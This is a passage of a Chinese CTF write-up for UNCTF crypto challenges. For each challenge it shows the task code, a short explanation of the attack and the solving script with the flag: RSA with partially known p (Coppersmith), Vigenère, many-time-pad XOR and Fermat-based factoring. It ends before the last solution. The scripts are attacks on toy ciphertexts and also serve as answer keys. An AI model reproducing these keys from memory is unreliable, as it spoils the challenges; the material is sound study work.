class="string">&#x27;QQQAQAQQQQAQAAQQAAAQAQQQQQAAQAQAQQQAQQQAQQAQAAQQAAQAAQQ&#x27;</span></span><br><span class="line">res2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;Q&#x27;</span>:</span><br><span class="line">        res2 += <span class="string">&#x27;a&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res2 += <span class="string">&#x27;b&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(res2)</span><br><span class="line">decrypt_24(res2)</span><br><span class="line"><span class="comment"># UNCTF&#123;CRYPROISFUN&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h3><p>题目：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">assert</span> flag.startwith(<span class="string">b&quot;flag&#123;&quot;</span>)</span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">c=<span class="number">6423951485971717307108570552094997465421668596714747882611104648100280293836248438862138501051894952826415798421772671979484920170142688929362334687355938148152419374972520025565722001651499172379146648678015238649772132040797315727334900549828142714418998609658177831830859143752082569051539601438562078140</span> </span><br><span class="line">n=<span class="number">102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553</span></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">p=getprime(<span class="number">512</span>)</span><br><span class="line">q=getprime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(c))</span><br><span class="line">tmp=random.randint(<span class="number">100</span>,<span class="number">300</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p&gt;&gt;tmp=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(p&gt;&gt;tmp))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#c=6423951485971717307108570552094997465421668596714747882611104648100280293836248438862138501051894952826415798421772671979484920170142688929362334687355938148152419374972520025565722001651499172379146648678015238649772132040797315727334900549828142714418998609658177831830859143752082569051539601438562078140 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#n=102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p&gt;&gt;200=8183408885924573625481737168030555426876736448015512229437332241283388177166503450163622041857</span></span><br></pre></td></tr></table></figure>
<p>经典的已知p的高位攻击。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553</span></span><br><span class="line">p0 = <span class="number">8183408885924573625481737168030555426876736448015512229437332241283388177166503450163622041857</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">pbits = <span class="number">512</span></span><br><span class="line">kbits = pbits - p0.nbits()</span><br><span class="line">p0 = p0 &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p0</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)</span><br><span class="line"><span class="keyword">if</span> roots:        </span><br><span class="line">	p = p0+<span class="built_in">int</span>(roots[<span class="number">0</span>]) </span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;p: &quot;</span>+<span class="built_in">str</span>(p))</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;q: &quot;</span>+<span class="built_in">str</span>(n//p))</span><br><span class="line"><span class="comment"># p: 13150231070519276795503757637337326535824298772055543325920447062237907554543786311611680606624189166397403108357856813812282725390555389844248256805325917</span></span><br><span class="line"><span class="comment"># q: 7763324082495716852870824316200424018139567206154696104953385573761033160220038511251268217230653629388520339723337700045392099450472580225771046069366909</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=<span class="number">13150231070519276795503757637337326535824298772055543325920447062237907554543786311611680606624189166397403108357856813812282725390555389844248256805325917</span></span><br><span class="line">q=<span class="number">7763324082495716852870824316200424018139567206154696104953385573761033160220038511251268217230653629388520339723337700045392099450472580225771046069366909</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">d=invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m=<span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h3 id="Multi-table"><a href="#Multi-table" class="headerlink" title="Multi table"></a>Multi table</h3><p>题目：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_uppercase</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint,shuffle</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex,a2b_hex</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;UNCTF&#123;&#125;&quot;</span></span><br><span class="line">base_table=<span class="built_in">list</span>(ascii_uppercase)</span><br><span class="line"><span class="comment"># shuffle(base_table)</span></span><br><span class="line"><span class="built_in">print</span>(base_table)</span><br><span class="line"></span><br><span class="line">table=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    table[i]=ascii_uppercase[i:]+ascii_uppercase[:i]</span><br><span class="line"></span><br><span class="line">key=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    key.append(randint(<span class="number">0</span>,<span class="number">25</span>))</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line">c=<span class="string">&#x27;&#x27;</span></span><br><span class="line">x=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> flag[i] <span class="keyword">in</span> ascii_uppercase:</span><br><span class="line">        c+=table[key[x%<span class="number">4</span>]][base_table.index(flag[i])]</span><br><span class="line">        x+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        c+=flag[i]</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [&#x27;J&#x27;, &#x27;X&#x27;, &#x27;I&#x27;, &#x27;S&#x27;, &#x27;E&#x27;, &#x27;C&#x27;, &#x27;R&#x27;, &#x27;Z&#x27;, &#x27;L&#x27;, &#x27;U&#x27;, &#x27;K&#x27;, &#x27;Q&#x27;, &#x27;Y&#x27;, &#x27;F&#x27;, &#x27;N&#x27;, &#x27;V&#x27;, &#x27;T&#x27;, &#x27;P&#x27;, &#x27;O&#x27;, &#x27;G&#x27;, &#x27;A&#x27;, &#x27;H&#x27;, &#x27;D&#x27;, &#x27;W&#x27;, &#x27;M&#x27;, &#x27;B&#x27;]</span></span><br><span class="line"><span class="comment"># SDCGW&#123;MPN_VHG_AXHU_GERA_SM_EZJNDBWN_UZHETD&#125;</span></span><br></pre></td></tr></table></figure>
<p>简单的维吉尼亚，就这题能比前两道RSA少，不理解。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_uppercase</span><br><span class="line"></span><br><span class="line">base_table = [<span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;B&#x27;</span>]</span><br><span class="line">table = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    table[i] = ascii_uppercase[i:] + ascii_uppercase[:i]</span><br><span class="line">plaintext = <span class="string">&#x27;SDCGW&#123;MPN_VHG_AXHU_GERA_SM_EZJNDBWN_UZHETD&#125;&#x27;</span></span><br><span class="line">name = <span class="string">&#x27;UNCTF&#x27;</span></span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        <span class="keyword">if</span> table[j][base_table.index(name[i])] == plaintext[i]:</span><br><span class="line">            key.append(j)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plaintext)):</span><br><span class="line">    <span class="keyword">if</span> plaintext[i] <span class="keyword">not</span> <span class="keyword">in</span> ascii_uppercase:</span><br><span class="line">        flag += plaintext[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">            <span class="keyword">if</span> plaintext[i] == table[key[x % <span class="number">4</span>]][j]:</span><br><span class="line">                flag += base_table[j]</span><br><span class="line">                x += <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># UNCTF&#123;WOW_YOU_KNOW_THIS_IS_VIGENERE_CIPHER&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="ezxor"><a href="#ezxor" class="headerlink" title="ezxor"></a>ezxor</h3><p>题目：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> key <span class="keyword">import</span> m,flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ <span class="built_in">ord</span>(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">OPT</span>(<span class="params">key,crypto</span>):</span><br><span class="line">    ciphertext=xor(key,crypto)</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line">ls=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    ls.append(m[i*<span class="number">42</span>:(i+<span class="number">1</span>)*<span class="number">42</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> ls:</span><br><span class="line">    k=OPT(flag,x).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(k)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">1c2063202e1e795619300e164530104516182d28020005165e01494e0d</span></span><br><span class="line"><span class="string">2160631d325b3b421c310601453c190814162d37404510041b55490d5d</span></span><br><span class="line"><span class="string">3060631d325b3e59033a1252102c560207103b22020613450549444f5d</span></span><br><span class="line"><span class="string">3420277421122f55067f1207152f19170659282b090b56121701405318</span></span><br><span class="line"><span class="string">212626742b1434551b2b4105007f110c041c7f361c451e0a02440d010a</span></span><br><span class="line"><span class="string">75222a22230877102137045212300409165928264c091f131701484f5d</span></span><br><span class="line"><span class="string">21272d33661237441a7f005215331706175930254c0817091b4244011c</span></span><br><span class="line"><span class="string">303c2674311e795e103a05520d300600521831274c031f0b160148555d</span></span><br><span class="line"><span class="string">3c3d63232909355455300752033a17175e59372c1c0056111d01474813</span></span><br><span class="line"><span class="string">752b22272f1e2b10063e0816452b1e041c593b2c02005a450649440110</span></span><br><span class="line"><span class="string">396e2f3d201e795f137f07130c2b1e450510332f4c08170e17014d481b</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>多次一密，当空格和大写字母异或时会得到对应的小写字母，和小写字母异或时会得到对应的大写字母，根据这一特性对密文相互异或得到的结果也就是明文相互异或得到的结果进行统计，分析出其出现空格的位置，然后解得明文，明文再与密文异或后得到flag。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">ciphertexts = [</span><br><span class="line">    <span class="string">&#x27;1c2063202e1e795619300e164530104516182d28020005165e01494e0d&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2160631d325b3b421c310601453c190814162d37404510041b55490d5d&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3060631d325b3e59033a1252102c560207103b22020613450549444f5d&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3420277421122f55067f1207152f19170659282b090b56121701405318&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;212626742b1434551b2b4105007f110c041c7f361c451e0a02440d010a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;75222a22230877102137045212300409165928264c091f131701484f5d&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;21272d33661237441a7f005215331706175930254c0817091b4244011c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;303c2674311e795e103a05520d300600521831274c031f0b160148555d&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3c3d63232909355455300752033a17175e59372c1c0056111d01474813&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;752b22272f1e2b10063e0816452b1e041c593b2c02005a450649440110&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;396e2f3d201e795f137f07130c2b1e450510332f4c08170e17014d481b&#x27;</span>,</span><br><span class="line">]</span><br><span class="line">ciphertexts = [binascii.unhexlify(x) <span class="keyword">for</span> x <span class="keyword">in</span> ciphertexts]</span><br><span class="line">target_ciphertext = ciphertexts[-<span class="number">1</span>]</span><br><span class="line">suspect_num = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strxor</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(x ^ y) <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ <span class="built_in">ord</span>(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isChr</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = [<span class="number">0</span>] * <span class="number">50</span></span><br><span class="line">max_space_count = [<span class="number">0</span>] * <span class="number">50</span></span><br><span class="line"><span class="keyword">for</span> ciphertext_a <span class="keyword">in</span> ciphertexts:</span><br><span class="line">    space_suspect_counts = [<span class="number">0</span>] * <span class="built_in">len</span>(ciphertext_a)</span><br><span class="line">    <span class="keyword">for</span> ciphertext_b <span class="keyword">in</span> ciphertexts:</span><br><span class="line">        <span class="keyword">if</span> ciphertext_a == ciphertext_b:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        a_xor_b = strxor(ciphertext_a, ciphertext_b)</span><br><span class="line">        <span class="keyword">for</span> char_idx, xor_resulting_char <span class="keyword">in</span> <span class="built_in">enumerate</span>(a_xor_b):</span><br><span class="line">            ascii_null = <span class="string">&quot;\x00&quot;</span></span><br><span class="line">            <span class="keyword">if</span> xor_resulting_char.isalpha() <span class="keyword">or</span> xor_resulting_char == ascii_null:</span><br><span class="line">                space_suspect_counts[char_idx] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> char_idx, suspect_count <span class="keyword">in</span> <span class="built_in">enumerate</span>(space_suspect_counts):</span><br><span class="line">        <span class="keyword">if</span> suspect_count &gt;= max_space_count[char_idx]:</span><br><span class="line">            whitespace = <span class="built_in">ord</span>(<span class="string">&quot; &quot;</span>)</span><br><span class="line">            suspect_key = ciphertext_a[char_idx] ^ whitespace</span><br><span class="line">            <span class="keyword">for</span> ciphertext_b <span class="keyword">in</span> ciphertexts:</span><br><span class="line">                <span class="keyword">if</span> char_idx &lt; <span class="built_in">len</span>(ciphertext_b):</span><br><span class="line">                    <span class="keyword">if</span> isChr(ciphertext_b[char_idx] ^ suspect_key):</span><br><span class="line">                        max_space_count[char_idx] = suspect_count</span><br><span class="line">                        key[char_idx] = suspect_key</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">target_plaintext = [<span class="number">0</span>] * <span class="number">11</span></span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">        res += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="keyword">for</span> ciphertext_c <span class="keyword">in</span> ciphertexts:</span><br><span class="line">    target_plaintext[i] = strxor(ciphertext_c, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;明文<span class="subst">&#123;i&#125;</span>:<span class="subst">&#123;target_plaintext[i]&#125;</span>&quot;</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">a = <span class="string">&#x27;1c2063202e1e795619300e164530104516182d28020005165e01494e0d&#x27;</span></span><br><span class="line">a = base64.b16decode(a.upper())</span><br><span class="line">c = <span class="string">&#x27;&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 对解得的明文中个别字符进行整理得到</span></span><br><span class="line">b = <span class="string">&#x27;In the flood of darkness, hop&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    c += <span class="built_in">chr</span>(i)</span><br><span class="line">res = xor(b, c)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># UNCTF&#123;Y0u_are_very_Clever!!!&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="Fermat"><a href="#Fermat" class="headerlink" title="Fermat"></a>Fermat</h3><p>题目：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag=<span class="string">b&#x27;UNCTF&#123;&#125;&#x27;</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">n=p*q</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line">x=getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">assert</span> gift+x==x*p</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(gift)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 19793392713544070457027688479915778034777978273001720422783377164900114996244094242708846944654400975309197274029725271852278868848866055341793968628630614866044892220651519906766987523723167772766264471738575578352385622923984300236873960423976260016266837752686791744352546924090533029391012155478169775768669029210298020072732213084681874537570149819864200486326715202569620771301183541168920293383480995205295027880564610382830236168192045808503329671954996275913950214212865497595508488636836591923116671959919150665452149128370999053882832187730559499602328396445739728918488554797208524455601679374538090229259</span></span><br><span class="line"><span class="comment"># 388040015421654529602726530745444492795380886347450760542380535829893454552342509717706633524047462519852647123869277281803838546899812555054346458364202308821287717358321436303133564356740604738982100359999571338136343563820284214462840345638397346674622692956703291932399421179143390021606803873010804742453728454041597734468711112843307879361621434484986414368504648335684946420377995426633388307499467425060702337163601268480035415645840678848175121483351171989659915143104037610965403453400778398233728478485618134227607237718738847749796204570919757202087150892548180370435537346442018275672130416574430694059</span></span><br><span class="line"><span class="comment"># 28493930909416220193248976348190268445371212704486248387964331415565449421099615661533797087163499951763570988748101165456730856835623237735728305577465527656655424601018192421625513978923509191087994899267887557104946667250073139087563975700714392158474439232535598303396614625803120915200062198119177012906806978497977522010955029535460948754300579519507100555238234886672451138350711195210839503633694262246536916073018376588368865238702811391960064511721322374269804663854748971378143510485102611920761475212154163275729116496865922237474172415758170527875090555223562882324599031402831107977696519982548567367160</span></span><br></pre></td></tr></table></figure>
<p>已知$(p-1)$的倍数，利用费马小定理可知$p | 2^{gift} - 1$，即可利用$gcd(2^{gift}-1\mod n,n)$得到p，进而解出flag。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">19793392713544070457027688479915778034777978273001720422783377164900114996244094242708846944654400975309197274029725271852278868848866055341793968628630614866044892220651519906766987523723167772766264471738575578352385622923984300236873960423976260016266837752686791744352546924090533029391012155478169775768669029210298020072732213084681874537570149819864200486326715202569620771301183541168920293383480995205295027880564610382830236168192045808503329671954996275913950214212865497595508488636836591923116671959919150665452149128370999053882832187730559499602328396445739728918488554797208524455601679374538090229259</span></span><br><span class="line">c = <span class="number">388040015421654529602726530745444492795380886347450760542380535829893454552342509717706633524047462519852647123869277281803838546899812555054346458364202308821287717358321436303133564356740604738982100359999571338136343563820284214462840345638397346674622692956703291932399421179143390021606803873010804742453728454041597734468711112843307879361621434484986414368504648335684946420377995426633388307499467425060702337163601268480035415645840678848175121483351171989659915143104037610965403453400778398233728478485618134227607237718738847749796204570919757202087150892548180370435537346442018275672130416574430694059</span></span><br><span class="line">gift = <span class="number">28493930909416220193248976348190268445371212704486248387964331415565449421099615661533797087163499951763570988748101165456730856835623237735728305577465527656655424601018192421625513978923509191087994899267887557104946667250073139087563975700714392158474439232535598303396614625803120915200062198119177012906806978497977522010955029535460948754300579519507100555238234886672451138350711195210839503633694262246536916073018376588368865238702811391960064511721322374269804663854748971378143510485102611920761475212154163275729116496865922237474172415758170527875090555223562882324599031402831107977696519982548567367160</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">a = <span class="built_in">pow</span>(<span class="number">2</span>, gift, n) - <span class="number">1</span></span><br><span class="line">p = gcd(a, n)</span><br><span class="line">q = n // p</span><br><span class="line">d = invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;UNCTF&#123;DO_y0u_Fermat_1ittle_theOrem&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="Today-is-Thursday-V-me-50"><a href="#Today-is-Thursday-V-me-50" class="headerlink" title="Today_is_Thursday_V_me_50"></a>Today_is_Thursday_V_me_50</h3><p>题目：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;unctf&quot;</span></span><br><span class="line">key1 = TOPIC</span><br><span class="line">key1_num = bytes_to_long(key1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_1</span>(<span class="params">message,name</span>):</span><br><span class="line">    res = message</span><br><span class="line">    guess=[i <span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(name, <span class="number">5</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        what = guess.pop(<span class="number">50</span>)</span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span>.join(j <span class="keyword">for</span> j <span class="keyword">in</span> what)</span><br><span class="line">        mask = strxor(<span class="number">5</span>*name.encode(),key1)</span><br><span class="line">        res = strxor(mask,message)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_2</span>(<span class="params">message,num</span>):</span><br><span class="line">    random.seed(num)</span><br><span class="line">    res_2 = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        temp_num = random.randint(<span class="number">1</span>,<span class="number">128</span>)</span><br><span class="line">        res_2 += long_to_bytes(temp_num ^ i)</span><br><span class="line">    <span class="keyword">return</span> res_2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    x = encrypt_2(encrypt_1(flag,name),key1_num)</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Q\x19)T\x18\x1b(\x03\t^c\x08QiF&gt;Py\x124DNg3P&#x27;</span></span><br></pre></td></tr></table></figure>
<p>对<code>encrypt_2</code>已知其随机数种子和返回值，可以逆向求得<code>encrypt_1</code>的结果，然后利用异或的性质再异或一次就能得到flag。</p>
<p>EXP:</p>
